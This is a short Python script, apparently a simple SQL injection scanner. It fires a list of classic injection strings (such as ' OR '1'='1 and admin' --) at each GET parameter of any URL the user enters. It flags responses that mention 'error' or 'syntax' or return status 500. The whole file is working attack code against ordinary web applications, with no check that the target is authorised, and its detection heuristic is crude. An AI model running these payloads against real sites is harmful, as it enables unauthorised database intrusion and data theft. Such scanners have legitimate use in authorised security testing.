import requests
from urllib.parse import urljoin

# List of common SQL Injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 'a'='a",
    "') OR ('a'='a",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "\" OR 1=1 --",
]

def scan_sql_injection(url, params, cookies=None):
    for param in params:
        for payload in payloads:
            # Create a copy of the parameters and inject the payload
            test_params = params.copy()
            test_params[param] = payload
            # Send the request with the payload
            try:
                response = requests.get(url, params=test_params, cookies=cookies)
                print(f"Testing {param} with payload: {payload}")
                print(f"URL: {response.url}")
                # Check if the response indicates a potential SQL Injection vulnerability
                if "error" in response.text.lower() or "syntax" in response.text.lower() or response.status_code == 500:
                    print(f"Potential SQL Injection vulnerability found with payload: {payload}")
                    print(f"Parameter: {param}")
                    print(f"URL: {response.url}")
                    print("="*50)
                else:
                    print(f"No vulnerability found with payload: {payload} on parameter: {param}")
                    print("="*50)
            except requests.RequestException as e:
                print(f"Error during request: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")  # URL to be tested
    param1 = input("Enter the first parameter name: ")  # First parameter name
    param2 = input("Enter the second parameter name (leave blank if not needed): ")  # Second parameter name (optional)
    parameters = {param1: "", param2: ""} if param2 else {param1: ""}

    # Optional cookies
    cookies_input = input("Enter cookies (key=value;key2=value2) or leave blank: ")
    cookies = dict(item.split("=") for item in cookies_input.split(";")) if cookies_input else None

    # Perform the scan
    scan_sql_injection(target_url, parameters, cookies)
